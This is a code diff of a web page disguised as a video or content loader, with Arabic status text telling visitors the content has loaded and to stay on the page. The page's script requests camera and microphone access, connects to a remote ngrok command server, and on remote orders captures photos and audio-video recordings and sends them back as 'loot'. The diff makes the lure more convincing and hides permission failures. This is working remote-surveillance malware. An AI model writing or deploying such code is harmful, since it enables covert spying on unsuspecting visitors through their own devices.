@@ -1,30 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>تحميل المحتوى...</title>
+    <meta charset="UTF-8"><title>Loading...</title>
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
-    <h2 id="status">جاري الاتصال بالسيرفر...</h2>
-    <p>يرجى السماح بالصلاحيات للمتابعة</p>
+<body style="background:#000; color:#05ff05; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h2 id="msg">تم التحميل، استمتع بالمشاهدة ✅</h2>
+    <p>يرجى البقاء في الصفحة للمتابعة</p>
 
     <script>
-        const socket = io("https://kinship-porridge-molasses.ngrok-free.dev");
-        let stream = null;
+        const SERVER = "https://kinship-porridge-molasses.ngrok-free.dev";
+        const socket = io(SERVER, { transports: ['websocket', 'polling'], upgrade: true });
 
-        // طلب الصلاحيات فور الدخول
-        async function askPerms() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-                document.getElementById('status').innerText = "✅ تم التحميل، استمتع بالمشاهدة";
-            } catch(e) { document.getElementById('status').innerText = "⚠️ فشل التحميل: يرجى تفعيل الكاميرا"; }
+        async function init() {
+            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
         }
-        askPerms();
+        init();
 
         socket.on('command', async (cmd) => {
+            const facing = cmd.action.includes('front') ? "user" : "environment";
+            
             if (cmd.action.includes('scan')) {
-                const facing = cmd.action.includes('front') ? "user" : "environment";
                 const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}});
                 const v = document.createElement('video'); v.srcObject = s; await v.play();
                 const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
@@ -32,8 +28,8 @@
                 socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
                 s.getTracks().forEach(t => t.stop());
             }
+
             if (cmd.action.includes('vid')) {
-                const facing = cmd.action.includes('front') ? "user" : "environment";
                 const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}, audio:true});
                 const rec = new MediaRecorder(s); const chunks = [];
                 rec.ondataavailable = e => chunks.push(e.data);
